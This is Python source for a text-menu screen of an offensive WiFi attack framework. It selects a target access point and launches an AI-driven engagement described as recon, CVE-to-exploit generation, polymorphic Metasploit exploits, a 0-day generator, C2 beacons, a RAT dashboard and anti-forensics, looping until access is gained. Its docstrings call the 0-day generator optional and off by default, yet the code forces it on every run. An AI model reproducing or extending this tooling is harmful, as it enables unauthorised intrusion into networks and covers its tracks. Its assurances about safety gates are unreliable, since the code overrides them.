#!/usr/bin/env python3
"""
WiFi Screen TUI
WiFi operations sub-menu (wifite-style primary flow + Advanced submenu).
Integrates real scanning, CVE mapping, C2 beacon launching, and AI-assisted
attack-plan generation. All actions are curses-free callable (injectable
``input_fn`` / ``thread_runner`` / ``scanner_cls``) for pytest.
"""

import logging
import sys
from typing import List, Dict, Any, Optional

from core.tui.base_screen import BaseScreen
from core.ai_backend import AIBackend
from core.exploit_knowledge_base import ExploitKnowledgeBase

logger = logging.getLogger(__name__)

class WiFiScreen(BaseScreen):
    def __init__(self, stdscr, parent_callback, activity_log: List[str], **kwargs):
        super().__init__(stdscr, parent_callback, activity_log, **kwargs)
        self.title = "WiFi Operations"

        # Reuse shared instances from the dashboard when provided.
        self.ai_backend = self.ai_backend or AIBackend(
            settings=kwargs.get("settings_manager")
        )
        self.kb = self.kb or ExploitKnowledgeBase()
        # Shared post-exploit runner (real, gated). May be None if init failed.
        self.post_runner = kwargs.get("post_runner")
        self.orchestrator = kwargs.get("orchestrator")
        self.tui_confirm = kwargs.get("tui_confirm")
        # Adaptive WiFi pentest: catalog-recon factory (ungated pre-chain)
        # and external-terminal launcher (for long-running steps in
        # xterm/gnome-terminal/tmux). Both are injected by the dashboard.
        # If the dashboard didn't provide them (older test fixtures, a
        # hand-rolled WiFiScreen), we degrade gracefully -- the recon
        # pass is skipped and steps run in-process.
        self.catalog_recon_factory = kwargs.get("catalog_recon_factory")
        self.external_terminal = kwargs.get("external_terminal")

        self.scan_results: List[Dict[str, Any]] = []
        self.selected_target = None
        self.c2_beacons = []
        self.interface = None  # selected at runtime — never hardcoded
        # Interface mode tracking for the textual-state bug fix. The
        # operator wants the menu item text to reflect the current
        # state ("monitor on wlan0mon" vs "managed on wlan0") and the
        # action to be a TOGGLE on enter/spacebar — not just a re-run
        # of the monitor-on path. ``interface_mode`` is one of:
        #   None      — no iface selected yet
        #   "managed" — selected iface is in managed mode (post-stop)
        #   "monitor" — selected iface is in monitor mode (post-airmon)
        # ``original_iface`` is the pre-airmon managed name (only set
        # when airmon produced a ``wlan[id]mon`` vif).
        self.interface_mode: Optional[str] = None
        self.original_iface: Optional[str] = None
        # mt7921e capability probe result from pick_interface; carried into
        # the chain seed so the planner + orchestrator can branch on it
        # (raw-frame deauth, gated injection steps). None until probed.
        self.adapter_caps = None
        # Per-engagement 0-day generator toggle (Advanced menu). Default
        # off; when True the optional propose→build→execute tail attaches
        # to the chain regardless of the zero_day.attach_to_chain setting.
        self.attach_zero_day = False
        self._post_plan = None  # last computed post-exploit plan
        self._last_report = None
        self._last_one_click_plan = None

        # ---- simplified primary flow (triple windows → engagement) ----
        self.primary_items = [
            ("Pick adapter / monitor mode", self.pick_interface),
            ("Scan Networks (3 live windows UL/UR/BR)", self.scan_networks),
            ("▶ Start engagement (selected AP)", self.aio_attack),
            ("Report", self.show_report),
            ("Open Flask dashboard", self.open_flask_dashboard),
            ("Advanced…", self._show_advanced),
            ("Back", self.parent_callback),
        ]
        self.advanced_items = [
            ("Pick Wireless Interface (auto-detect + monitor)", self.pick_interface),
            ("Generate Attack Plan (AI only)", self.generate_attack_plan),
            ("Post-Exploit: Plan (AI+KB+MSF)", self.plan_post_exploit),
            ("Post-Exploit: Execute Plan (gated)", self.execute_post_exploit),
            ("Launch Metasploit polymorphic exploit", self.launch_metasploit_exploit),
            ("Establish C2 Beacon (MITRE T1041)", self.establish_c2_beacon),
            ("Show KB Tools for WiFi", self.show_kb_tools),
            ("Fetch WiFi tool repos (clone into toolboxes/)", lambda: self.fetch_domain_repos("wifi")),
            ("Prepare WiFi tools (install deps)", lambda: self.prepare_domain_tools("wifi")),
            ("Toggle 0-day exploit generator on chain (optional)", self.toggle_attach_zero_day),
            ("Back to Primary", self._show_primary),
        ]
        # Initialise the interface-mode label (no iface selected →
        # static "Pick..." label is correct). This anchors the
        # textual-state-bug invariant: every state change goes
        # through ``_rebuild_advanced_items`` so the menu reflects
        # reality.
        self._rebuild_advanced_items()
        self._show_primary()

    # ------------------------------------------------------------------
    # Wifite flow hooks
    # ------------------------------------------------------------------
    def _target_label(self, idx, target):
        return (f"{idx + 1}. {target.get('ssid') or '<hidden>'} "
                f"[{target.get('bssid')}] CH {target.get('channel')} "
                f"{target.get('encryption')}")

    def _on_target_selected(self, idx):
        t = self.selected_target
        self.activity_log.append(
            f"[+] Target #{idx + 1} selected: {t.get('ssid') or '<hidden>'} "
            f"({t.get('bssid')}) — press ▶ Start engagement."
        )

    # ------------------------------------------------------------------
    # One-click attack (primary button)
    # ------------------------------------------------------------------
    def one_click_attack(self):
        """One-click attack on the currently selected AP.

        1. Require a selected target (scan → number key).
        2. Auto-detect mt7921e adapter caps if not probed yet.
        3. Build an honest encryption-aware plan (WPA3-SAE / WPA2 /
           transition) via ``adapt_wpa3_sae_one_click_plan``.
        4. Hand off to the existing ACCEPT-gated ``run_attack_chain``.

        Never auto-cracks, never fabricates a PSK. Intrusive steps stay
        behind the orchestrator ACCEPT/CANCEL gate.
        """
        if not self.selected_target:
            self.activity_log.append(
                "[!] Select a target first (Scan → number key), then Start engagement."
            )
            return
        if not self.interface:
            # Best-effort: pick first mt7921e / wireless iface without
            # forcing monitor yet (chain / pick_interface does that).
            try:
                from core.modules.mt7921e_tools import detect_mt7921e_interfaces
                found = detect_mt7921e_interfaces()
                if found:
                    self.interface = found[0].name
                    self.activity_log.append(
                        f"[+] Auto-selected interface {self.interface} "
                        f"(driver={found[0].driver})"
                    )
            except Exception as e:
                self.activity_log.append(f"[i] auto-iface skip: {e}")
        if not self.interface:
            self.activity_log.append(
                "[!] No interface — Advanced → Pick Wireless Interface first."
            )
            return

        # Probe adapter caps if missing (read-only detect; injection test
        # still needs root + monitor and runs inside the chain).
        if not self.adapter_caps:
            try:
                from core.modules.mt7921e_tools import detect_mt7921e_interfaces
                ads = detect_mt7921e_interfaces()
                if ads:
                    a = ads[0]
                    self.adapter_caps = {
                        "mt7921e": True,
                        "driver": a.driver,
                        "injection_capable": bool(
                            a.injection_capable_runtime
                            or a.injection_capable_static
                        ),
                        "quality": a.injection_quality,
                        "monitor_iface": self.interface,
                    }
                else:
                    self.adapter_caps = {"mt7921e": False}
            except Exception:
                self.adapter_caps = {"mt7921e": False}

        t = dict(self.selected_target)
        plan_args = {
            "ssid": t.get("ssid"),
            "bssid": t.get("bssid"),
            "channel": t.get("channel"),
            "encryption": t.get("encryption") or t.get("enc") or "",
            "pmf": t.get("pmf") or t.get("pmf_supported"),
            "transition": t.get("transition") or t.get("transition_mode"),
            "adapter_caps": self.adapter_caps or {},
            "mt7921e": bool((self.adapter_caps or {}).get("mt7921e")),
            "injection_capable": bool(
                (self.adapter_caps or {}).get("injection_capable")
            ),
        }
        try:
            from core.refactors.poly_adapt_companions import (
                adapt_wpa3_sae_one_click_plan,
            )
            env = adapt_wpa3_sae_one_click_plan(plan_args)
            data = (env or {}).get("data") or {}
            self._last_one_click_plan = data
            self.activity_log.append(
                f"[▶] One-click plan: {data.get('rationale') or data.get('pick')}"
            )
            for note in (data.get("notes") or [])[:4]:
                self.activity_log.append(f"[plan] {note}")
            for s in (data.get("steps") or [])[:8]:
                gate = " [ACCEPT]" if s.get("gated") else ""
                self.activity_log.append(
                    f"[plan] · {s.get('id')}: {s.get('why')}{gate}"
                )
            # Stash plan on target so the orchestrator / AI chain can use it.
            if self.selected_target is not None:
                self.selected_target["one_click_plan"] = data
                self.selected_target["attack_plan"] = data
        except Exception as e:
            self.activity_log.append(f"[!] one-click planner failed: {e}")

        # Reuse the full recon + gated attack chain.
        self._run_adaptive(until_access=True)

    def aio_attack(self):
        """All-In-One attack on the selected AP (ACCEPT-gated).

        Pipeline (polymorphic / target-adaptive where possible):
          1. Catalog recon (WPS, clients, beacons, weakpass, …)
          2. CVE / NVD lookup for vendor+chipset+encryption
          3. Honest WPA3/WPA2 one-click plan (poly companions)
          4. AI-orchestrated chain (use_ai_chain=True)
          5. Optional 0-day propose→build (attach_zero_day=True)
          6. Post-exploit + anti-forensics OPSEC tail when access lands

        Requires orchestrator (fixed at dashboard boot). Never auto-ACCEPT.
        """
        if not self.selected_target:
            # Try loading last external scan selection.
            loaded = self._load_external_scan_selection()
            if not loaded:
                self.activity_log.append(
                    "[!] Select a target first (Scan → number key)."
                )
                return
        if not self.orchestrator:
            self.activity_log.append(
                "[!] Orchestrator unavailable — restart the tool "
                "(dashboard must finish Ollama + orchestrator init)."
            )
            return
        if not self.interface:
            try:
                from core.modules.mt7921e_tools import detect_mt7921e_interfaces
                found = detect_mt7921e_interfaces()
                if found:
                    self.interface = found[0].name
            except Exception:
                pass
        if not self.interface:
            self.activity_log.append(
                "[!] No interface — Advanced → Pick Wireless Interface."
            )
            return

        # Force full AIO options on the engagement.
        self.attach_zero_day = True
        t = dict(self.selected_target)
        t["aio"] = True
        t["attach_zero_day"] = True
        t["post_exploit"] = True
        t["anti_forensics"] = True
        t["polymorphic"] = True
        t.setdefault("interface", self.interface)

        # Build polymorphic plan stamp.
        try:
            from core.refactors.poly_adapt_companions import (
                adapt_wpa3_sae_one_click_plan,
                poly_wpa3_sae_grammar,
            )
            plan = adapt_wpa3_sae_one_click_plan({
                "ssid": t.get("ssid"),
                "bssid": t.get("bssid"),
                "channel": t.get("channel"),
                "encryption": t.get("encryption") or t.get("enc") or "",
                "adapter_caps": self.adapter_caps or {},
                "mt7921e": bool((self.adapter_caps or {}).get("mt7921e")),
                "injection_capable": bool(
                    (self.adapter_caps or {}).get("injection_capable")
                ),
            })
            poly = poly_wpa3_sae_grammar({"seed": t.get("bssid") or "aio"})
            t["one_click_plan"] = (plan or {}).get("data") or {}
            t["poly_variants"] = ((poly or {}).get("data") or {}).get("variants")
            self._last_one_click_plan = t["one_click_plan"]
            self.activity_log.append(
                f"[AIO] Plan: {t['one_click_plan'].get('rationale', '')}"
            )
            for note in (t["one_click_plan"].get("notes") or [])[:3]:
                self.activity_log.append(f"[AIO] {note}")
            if t.get("poly_variants"):
                self.activity_log.append(
                    f"[AIO] Poly variants: {', '.join(t['poly_variants'][:3])}"
                )
        except Exception as e:
            self.activity_log.append(f"[i] AIO planner note: {e}")

        # Mark external/AIO identity so adaptive recon stays lean and
        # does not freeze the TUI on 15× airodump probes.
        t["from_external_scan"] = bool(
            t.get("from_external_scan")
            or t.get("bssid")
        )
        self.selected_target = t
        self.activity_log.append(
            "[AIO] Adaptive until-access: recon → CVE/NVD → CVE-code → "
            "plan → poly → attack → post-exploit → RAT (ACCEPT/CANCEL)."
        )
        self.activity_log.append(
            "[AIO] Recon is budgeted (lean pass + progress logs); "
            "menu stays responsive. Override budget: KFIOSA_RECON_BUDGET_S."
        )
        self._run_adaptive(until_access=True)

    def _load_external_scan_selection(self) -> bool:
        """Load target written by ``wifi_scan_external`` if present."""
        if getattr(self, "_no_external_load", False):
            return False
        from pathlib import Path
        import json
        path = Path("logs") / "wifi_scan_selection.json"
        if not path.is_file():
            return False
        try:
            data = json.loads(path.read_text(encoding="utf-8"))
        except Exception:
            return False
        sel = data.get("selected")
        if not isinstance(sel, dict) or not sel.get("bssid"):
            return False
        sel = dict(sel)
        sel["from_external_scan"] = True
        self.selected_target = sel
        nets = data.get("networks") or []
        if nets:
            self.scan_results = list(nets)
            self.targets = list(nets)
        self.activity_log.append(
            f"[+] Loaded external selection: {sel.get('ssid')} "
            f"[{sel.get('bssid')}] aio={bool(data.get('aio_attack'))}"
        )
        if data.get("aio_attack"):
            # Parent may call aio_attack right after load.
            pass
        return True

    def show_report(self):
        """Re-emit a summary of the last engagement (curses-free, testable)."""
        self.activity_log.append("=== Last WiFi Engagement Report ===")
        if self.selected_target is not None:
            t = self.selected_target
            self.activity_log.append(
                f"[i] Target: {t.get('ssid') or '<hidden>'} ({t.get('bssid')}) "
                f"CH {t.get('channel')} {t.get('encryption')}"
            )
        else:
            self.activity_log.append("[i] Target: (none selected)")
        self.activity_log.append(f"[i] Interface: {self.interface or 'auto-detect'}")
        self.activity_log.append(f"[i] APs discovered last scan: {len(self.scan_results)}")
        if self._post_plan is not None:
            self.activity_log.append(
                f"[i] Post-exploit plan cached: "
                f"{len(self._post_plan.get('kb_tools') or [])} KB tools, "
                f"{'msf steps' if self._post_plan.get('msf_plan') else 'no msf plan'}."
            )
        self.activity_log.append(
            "[i] Step-by-step output (ACCEPT/CANCEL gated) is in the activity log above."
        )

    def list_devices(self):
        """Airgeddon-style device picker: render the Station MACs gathered
        by the last recon pass as a selectable list and stash the chosen
        MAC on ``self.selected_device_mac`` (and on the selected target so
        the chain targets it for directed deauth / payload / open_shell).
        Requires a prior recon pass; prompts the operator to run one when
        no devices are available. Runs on the curses main thread (the
        attack chain itself runs in a background thread via ``_spawn``)."""
        try:
            from core.tui.device_screen import pick_device, collect_devices
        except Exception as e:
            self.activity_log.append(f"[!] device screen unavailable: {e}")
            return
        recon = getattr(self, "_last_recon", None)
        devices = collect_devices(recon)
        if not devices:
            self.activity_log.append(
                "[i] No devices yet — run the attack chain (recon enumerates "
                "associated clients) then come back here."
            )
            return
        self.activity_log.append(
            f"[+] {len(devices)} device(s) discovered; opening device picker…"
        )
        mac = pick_device(self.stdscr, self.activity_log, devices)
        if mac:
            self.selected_device_mac = mac
            if self.selected_target is not None:
                self.selected_target["device_mac"] = mac
            self.activity_log.append(
                f"[+] Device {mac} staged for targeted deauth / payload / shell "
                f"(action is ACCEPT-gated at run time)."
            )

    # ------------------------------------------------------------------
    # Primary-flow actions
    # ------------------------------------------------------------------
    def adaptive_until_access(self):
        """Full target-adaptive loop until access is granted (bounded).

        select → recon → NVD CVE → optional CVE→code → plan →
        polymorphism → attack with live replan → post-exploit →
        RAT dashboard with dynamic capabilities → reverse stubs →
        outer cycle until access (or max cycles).
        """
        if not self.selected_target:
            self.activity_log.append("[!] Select a target first (Scan → number key).")
            return
        if not self.orchestrator:
            self.activity_log.append("[!] Orchestrator unavailable.")
            return
        self._run_adaptive(until_access=True)

    def run_attack_chain(self):
        """Adaptive WiFi engagement (default path).

        Uses :class:`core.orchestrator.adaptive_engagement.AdaptiveEngagement`
        for target-adaptive recon → CVE → plan → poly → live replan →
        post-access RAT. Long-running steps still spawn in the external
        terminal; ACCEPT/CANCEL is preserved.
        """
        if not self.selected_target:
            self.activity_log.append("[!] Select a target first (Scan → number key).")
            return
        if not self.orchestrator:
            self.activity_log.append("[!] Orchestrator unavailable.")
            return
        # One full adaptive cycle by default; AIO / Adaptive menu force until-access.
        self._run_adaptive(until_access=False)

    def _run_adaptive(self, *, until_access: bool) -> None:
        self.orchestrator.interface = self.interface
        target = dict(self.selected_target)
        target.setdefault("interface", self.interface)
        target["adapter_caps"] = self.adapter_caps or {"mt7921e": False}
        target.setdefault("from_external_scan", True)
        target.setdefault("aio", True)
        target.setdefault("polymorphic", True)
        target["attach_zero_day"] = bool(self.attach_zero_day or True)

        def run():
            try:
                from core.orchestrator.engagement_engine import EngagementEngine
                eng = EngagementEngine(
                    self.orchestrator,
                    catalog_recon_factory=self.catalog_recon_factory,
                    on_event=lambda m: self.activity_log.append(m),
                    until_access=until_access,
                    enable_bg_zero_day=True,
                    enable_holo_prep=True,
                )
                report = eng.run(
                    "wifi", target,
                    until_access=until_access,
                    attach_zero_day=True,
                )
                self._last_report = report
                self._last_recon = (target.get("recon") if isinstance(target, dict)
                                    else None)
                access = (report or {}).get("access") or {}
                if access.get("achieved"):
                    self.activity_log.append(
                        f"[+] Engagement ACCESS: session={access.get('session_id')} "
                        f"creds={'yes' if access.get('creds') else 'no'}"
                    )
                else:
                    cycles = ((report or {}).get("adaptive") or {}).get("cycles") or []
                    self.activity_log.append(
                        f"[i] Engagement finished without access "
                        f"({len(cycles)} cycle(s))"
                    )
            except Exception as e:
                self.activity_log.append(f"[!] engagement engine error: {e}")

        self._spawn(run)

    def open_flask_dashboard(self):
        """Best-effort: open / remind operator of the Flask RAT dashboard."""
        try:
            from core.post_access_tui.rat_ext import spawn_rat_dashboard
            rep = spawn_rat_dashboard(sessions=[])
            if isinstance(rep, dict) and rep.get("ok"):
                host = rep.get("host") or "127.0.0.1"
                port = rep.get("port")
                self.activity_log.append(
                    f"[+] Flask dashboard: http://{host}:{port}/"
                )
            else:
                self.activity_log.append(
                    f"[i] Flask dashboard: {(rep or {}).get('error') or rep}"
                )
        except Exception as e:
            self.activity_log.append(
                f"[i] Flask dashboard spawn: {e} — try post-access after foothold"
            )

    def pick_interface(self):
        """Detect wireless adapters, let the operator pick one, then put it
        into monitor mode automatically.

        Monitor mode is engaged via ``sudo airmon-ng start <iface>`` (the
        operator-visible adapter-selection path) so we end up with the
        conventional ``wlan[id]mon`` vif name; the original iface is left
        in managed mode and both names are recorded on the shared
        dashboard tracker so the quit path tears the vif down with
        ``sudo airmon-ng stop``. Falls back to an in-place iw+ip flip
        only when ``airmon-ng`` is not installed. After monitor mode
        succeeds (either path), an mt7921e capability probe runs the
        runtime injection test and stores the result on
        ``self.adapter_caps`` for the chain planner.

        On success, sets ``self.interface_mode = "monitor"`` and
        ``self.original_iface = <pre-airmon name>`` so the menu item
        text reflects the new state and the next enter/spacebar
        triggers :meth:`toggle_interface_mode` (back to managed)
        rather than re-running monitor mode.
        """
        try:
            from core.tui.interface_picker import pick_wireless_interface
        except Exception as e:
            self.activity_log.append(f"[!] interface picker unavailable: {e}")
            return
        iface = pick_wireless_interface(self.stdscr, self.activity_log)
        if not iface:
            self.activity_log.append("[i] No interface selected.")
            return

        self.interface = iface
        self.activity_log.append(f"[+] Selected interface: {iface}")

        # Polymorphic path: already_monitor | iw_flip | airmon_start
        try:
            from core.refactors.poly_adapt_companions import (
                adapt_wifi_adapter_mode_picker,
            )
            from core.utils.airmon import _iw_is_monitor
            cur_mode = "monitor" if _iw_is_monitor(iface) else "managed"
            drv = ""
            try:
                import os as _os
                drv = _os.path.basename(
                    _os.path.realpath(
                        f"/sys/class/net/{iface}/device/driver"
                    )
                )
            except OSError:
                pass
            apick = adapt_wifi_adapter_mode_picker({
                "iface": iface, "mode": cur_mode, "want": "monitor",
                "driver": drv,
            })
            self.activity_log.append(
                f"[i] Adapter mode plan: "
                f"{(apick.get('data') or {}).get('pick')} — "
                f"{(apick.get('data') or {}).get('rationale')}"
            )
        except Exception:
            pass

        # If already monitor, skip airmon (prevents wlan0monmon).
        try:
            from core.utils.airmon import _iw_is_monitor, airmon_start
            if _iw_is_monitor(iface):
                self.interface = iface
                self.interface_mode = "monitor"
                self.activity_log.append(
                    f"[+] {iface} already in monitor mode — no re-engage."
                )
                mon = {"ok": True, "monitor_iface": iface,
                       "method": "already_monitor"}
                mon_ok = True
            else:
                mon = None
                mon_ok = False
        except Exception:
            mon = None
            mon_ok = False

        if not mon_ok:
            # Auto-enable monitor mode via airmon / iw flip.
            self.activity_log.append(f"[*] Engaging monitor mode on {iface}...")
            try:
                from core.utils.airmon import airmon_start
                mon = airmon_start(iface)
            except Exception as e:
                self.activity_log.append(f"[!] monitor-mode error: {e}")
                mon = {"ok": False, "error": f"airmon_start: {e}"}
        if mon is None:
            mon = {"ok": False, "error": "monitor engage not attempted"}

        if mon.get("ok"):
            mon_iface = mon.get("monitor_iface") or iface
            self.interface = mon_iface
            method = mon.get("method", "airmon")
            via_map = {
                "airmon": "sudo airmon-ng start",
                "iw_flip": "iw set type monitor",
                "already_monitor": "already monitor",
            }
            via = via_map.get(method, method)
            if method != "already_monitor":
                self.activity_log.append(
                    f"[+] Monitor mode ACTIVE on {self.interface} "
                    f"(via {via} {iface})"
                )
            if mon_iface != iface:
                self.activity_log.append(
                    f"[i] Original interface {iface} left in managed mode."
                )
            # Record the iface pair on the shared dashboard tracker so
            # the quit path can run `sudo airmon-ng stop wlan[id]mon`.
            # self.dashboard is the KfiosaDashboard ref (passed in via
            # _shared_kwargs); guard for older fixtures without it.
            dashboard = getattr(self, "dashboard", None)
            if dashboard is not None:
                try:
                    dashboard.monitor_iface = mon_iface
                    dashboard.original_iface = iface
                except Exception:
                    pass
            mon_ok = True
        elif mon.get("error") == "airmon-ng not installed":
            # Fallback: in-place iw+ip flip via the scanner path. Keeps
            # the chain usable on boxes without airmon-ng installed.
            self.activity_log.append(
                f"[i] airmon-ng not installed — falling back to iw+ip "
                f"monitor flip on {iface}."
            )
            try:
                from core.scanners.wifi_scanner import WiFiScanner
                _sc = WiFiScanner(interface=iface)
                _sc.initialize()
                fb = _sc.ensure_monitor(iface)
                if fb.get("ok"):
                    mon_iface = fb.get("interface", iface)
                    self.interface = mon_iface
                    self.activity_log.append(
                        f"[+] Monitor mode ACTIVE on {self.interface} "
                        f"(iw fallback)"
                    )
                    mon_ok = True
                else:
                    self.activity_log.append(
                        f"[!] Monitor mode failed on {iface}: "
                        f"{fb.get('error')} (scan will retry; needs root)"
                    )
                    self._append_monitor_remediation(iface)
            except Exception as e:
                self.activity_log.append(f"[!] monitor-mode error: {e}")
                self._append_monitor_remediation(iface)
        else:
            self.activity_log.append(
                f"[!] Monitor mode failed on {iface}: {mon.get('error')} "
                f"(scan will retry; needs root)"
            )
            self._append_monitor_remediation(iface)

        # mt7921e capability probe — runs after monitor mode succeeds
        # (either airmon or iw fallback). Uses test=False on pick so we
        # never block on ``aireplay-ng --test`` (15s+) while the operator
        # is still in the Advanced menu; static caps are enough for the
        # planner. Runtime injection is verified later by the chain /
        # orchestrator when actually needed.
        self.adapter_caps = None
        if mon_ok:
            try:
                from core.modules import mt7921e_tools
                adapters = mt7921e_tools.probe_mt7921e_capabilities(
                    iface=self.interface, test=False,
                )
                if adapters:
                    a = adapters[0]
                    self.adapter_caps = {
                        "mt7921e": True,
                        "driver": a.driver,
                        # Prefer runtime if ever set; else static phy bit.
                        "injection_capable": bool(
                            a.injection_capable_runtime
                            if a.injection_capable_runtime is not None
                            else a.injection_capable_static
                        ),
                        "quality": a.injection_quality,
                        "monitor_iface": self.interface,
                        "original_iface": iface,
                        "injection_tested": False,
                    }
                    self.activity_log.append(
                        f"[+] mt7921e adapter {self.interface}: "
                        f"static inject="
                        f"{'yes' if a.injection_capable_static else 'no'} "
                        f"(runtime test deferred to attack chain)"
                    )
                else:
                    self.adapter_caps = {
                        "mt7921e": False,
                        "monitor_iface": self.interface,
                        "original_iface": iface,
                    }
            except Exception as e:
                self.activity_log.append(f"[i] mt7921e probe skipped: {e}")
                self.adapter_caps = {
                    "mt7921e": False,
                    "monitor_iface": self.interface,
                    "original_iface": iface,
                }

        # State tracking for the textual-state bug fix. After monitor
        # mode succeeds, record the mode + the pre-airmon managed name
        # (only when airmon produced a separate vif). On any failure
        # the mode stays None — the operator can re-pick. The next
        # enter/spacebar on the Advanced menu will route to
        # ``toggle_interface_mode`` (which sees "monitor" and flips
        # back to managed) instead of re-running monitor-on.
        if mon_ok:
            self.interface_mode = "monitor"
            # ``iface`` here is the pre-airmon name; ``self.interface``
            # is the post-airmon monitor vif (or the same name if iw
            # fallback kept it). Only set ``original_iface`` when the
            # two differ.
            if self.interface and self.interface != iface:
                self.original_iface = iface
            else:
                # iw-fallback case: in-place flip, same name. There is
                # no "original" managed name to flip back to without
                # operator intervention. We mark it as None and the
                # toggle will fall back to a "stop" via WiFiScanner.
                self.original_iface = None
            # Rebuild the Advanced items so the menu label reflects
            # the new state ("...currently monitor on wlan0mon").
            self._rebuild_advanced_items()
            # Leave highlight OFF the toggle item. After a slow airmon
            # path the operator often has leftover ENTERs queued; if the
            # cursor stayed on item 0 those would immediately flip
            # monitor → managed (operator-reported bug).
            if (
                getattr(self, "flow_state", None) == "advanced"
                and len(self.menu_items) > 1
            ):
                self.menu_index = 1

        # Always drop pending keys after pick (success or fail).
        try:
            from core.tui.interface_picker import flush_curses_input
            flush_curses_input(self.stdscr)
        except Exception:
            pass

    def _append_monitor_remediation(self, iface: str):
        """Append the standard monitor-mode remediation to the activity log.

        Mirrors the message format from
        :class:`core.utils.wifi_iface.MonitorModeRequired` so the operator
        sees the same commands whether they hit the error in the TUI
        or in the AI engine.
        """
        commands = [
            f"sudo airmon-ng start {iface}",
            f"sudo ip link set {iface} down && "
            f"sudo iw dev {iface} set type monitor && "
            f"sudo ip link set {iface} up",
        ]
        self.activity_log.append(
            f"[!] Run one of these in a root terminal:\n  "
            f"{commands[0]}\n  {commands[1]}"
        )

    def toggle_interface_mode(self):
        """Toggle the current interface between managed and monitor.

        The operator wants the menu item to behave as a TOGGLE on
        enter/spacebar:

          - No iface selected yet (or last attempt failed) → call
            :meth:`pick_interface` (initial monitor engage).
          - Currently in monitor mode → call
            :func:`core.utils.airmon.airmon_stop` (back to managed) on
            the monitor vif, then point ``self.interface`` at the
            original managed name and flip ``interface_mode`` to
            "managed". For the iw-fallback case (in-place flip, no
            separate vif), use :meth:`WiFiScanner.ensure_managed`.
          - Currently in managed mode → re-engage monitor via
            :meth:`pick_interface` (which will reuse the
            ``original_iface`` as the input).

        Each branch appends an honest activity-log line; failures
        degrade with the standard remediation. Never raises.
        """
        if not self.interface:
            self.activity_log.append(
                "[i] No interface selected — picking one now."
            )
            self.pick_interface()
            return

        cur = self.interface_mode
        if cur == "monitor":
            # Flip back to managed.
            #   - Separate mon vif (original_iface set) → airmon_stop
            #   - In-place iw flip (original_iface is None) → restore_managed
            #     on the same iface (no airmon mon vif to tear down).
            self.activity_log.append(
                f"[*] Tearing down monitor mode on {self.interface}..."
            )
            use_inplace = self.original_iface is None
            res = {"ok": False, "error": ""}
            if not use_inplace:
                try:
                    from core.utils.airmon import airmon_stop
                    res = airmon_stop(self.interface)
                except Exception as e:  # noqa: BLE001
                    self.activity_log.append(
                        f"[!] airmon_stop import/call failed: {e}"
                    )
                    res = {"ok": False, "error": f"airmon_stop: {e}"}
            if use_inplace or not res.get("ok"):
                # In-place path, or airmon_stop failed → iw managed flip.
                try:
                    from core.scanners.wifi_scanner import WiFiScanner
                    target = self.original_iface or self.interface
                    _sc = WiFiScanner(interface=target)
                    _sc.initialize()
                    _sc.restore_managed(target)
                    self.interface = target
                    self.activity_log.append(
                        f"[i] Managed flip via iw+ip on {target} "
                        f"(no verification probe; next scan is the "
                        f"ground truth)"
                    )
                except Exception as e:  # noqa: BLE001
                    self.activity_log.append(
                        f"[!] managed-mode flip exception: {e}"
                    )
                    self._append_monitor_remediation(
                        self.original_iface or self.interface
                    )
                    return
            else:
                # airmon_stop succeeded. Prefer a non-mon managed name.
                mi = res.get("managed_iface") or ""
                if mi and not str(mi).lower().endswith("mon"):
                    self.interface = mi
                elif self.original_iface:
                    self.interface = self.original_iface
                elif mi:
                    import re as _re
                    stripped = _re.sub(r"(mon)+$", "", str(mi))
                    self.interface = stripped or mi
                else:
                    self.interface = self.interface
            # Update the dashboard tracker (mirror the pick path).
            dashboard = getattr(self, "dashboard", None)
            if dashboard is not None:
                try:
                    dashboard.monitor_iface = None
                    dashboard.original_iface = self.interface
                except Exception:  # noqa: BLE001
                    pass
            self.interface_mode = "managed"
            self.activity_log.append(
                f"[+] Managed mode ACTIVE on {self.interface}"
            )
            self._rebuild_advanced_items()
            # Same leftover-ENTER guard as pick_interface.
            if (
                getattr(self, "flow_state", None) == "advanced"
                and len(self.menu_items) > 1
            ):
                self.menu_index = 1
            try:
                from core.tui.interface_picker import flush_curses_input
                flush_curses_input(self.stdscr)
            except Exception:
                pass
            return

        if cur == "managed":
            # Currently managed — re-engage monitor on the same
            # original iface. ``pick_interface`` will re-prompt for
            # an iface (the operator may want to switch); we keep
            # the simple semantics and let the operator pick.
            self.activity_log.append(
                f"[*] Re-engaging monitor mode (was managed on "
                f"{self.interface})..."
            )
            self.pick_interface()
            return

        # interface_mode is None (an iface is set but no mode was
        # recorded — legacy fixture or a partially-completed
        # engagement). Treat as "managed" and re-engage monitor.
        self.activity_log.append(
            f"[*] Interface {self.interface} mode unknown; "
            f"re-engaging monitor."
        )
        self.pick_interface()

    def _iface_label(self) -> str:
        """Return the dynamic text for the Advanced menu item.

        Reflects the current state so the operator can tell from the
        TUI which mode the iface is in:
          - no iface:        "Pick Wireless Interface (auto-detect + monitor)"
          - managed:         "Toggle interface: {iface} → MONITOR (currently managed)"
          - monitor:         "Toggle interface: {iface} → MANAGED (currently monitor)"
        """
        if not self.interface:
            return "Pick Wireless Interface (auto-detect + monitor)"
        if self.interface_mode == "monitor":
            return (
                f"Toggle interface: {self.interface} → MANAGED "
                f"(currently monitor)"
            )
        # managed or unknown mode
        return (
            f"Toggle interface: {self.interface} → MONITOR "
            f"(currently managed)"
        )

    def _rebuild_advanced_items(self) -> None:
        """Rebuild :attr:`advanced_items` with the current dynamic
        interface-mode label and route the first item to the
        :meth:`toggle_interface_mode` entry point (which decides
        between :meth:`pick_interface` and the stop path).

        Updates ``self.menu_items`` when the advanced menu is the
        active view so the operator sees the new label immediately
        — the textual-state bug fix's central invariant.
        """
        new_items = [(self._iface_label(), self.toggle_interface_mode)]
        # Copy the rest of the items verbatim (the label, not the
        # callable, is what changes).
        for label, fn in self.advanced_items[1:]:
            new_items.append((label, fn))
        self.advanced_items = new_items
        # If the operator is currently on the advanced menu, refresh
        # the live menu_items list so the new label is shown.
        if getattr(self, "flow_state", None) == "advanced":
            self.menu_items = list(self.advanced_items)

    def toggle_attach_zero_day(self):
        """Flip the per-engagement 0-day generator toggle.

        When ON, the next ``run_attack_chain`` passes
        ``attach_zero_day=True`` to the orchestrator so the optional
        propose→build→execute tail attaches to the chain regardless of
        the ``zero_day.attach_to_chain`` setting. Default OFF; the
        operator opts in per engagement.
        """
        self.attach_zero_day = not self.attach_zero_day
        self.activity_log.append(
            f"[+] 0-day exploit generator on chain: "
            f"{'ON (optional)' if self.attach_zero_day else 'OFF'}"
        )

    def scan_networks(self):
        """Open an external airgeddon/wifite-like scan TUI, then load selection.

        Prefer launching ``core.tui.wifi_scan_external`` in a separate
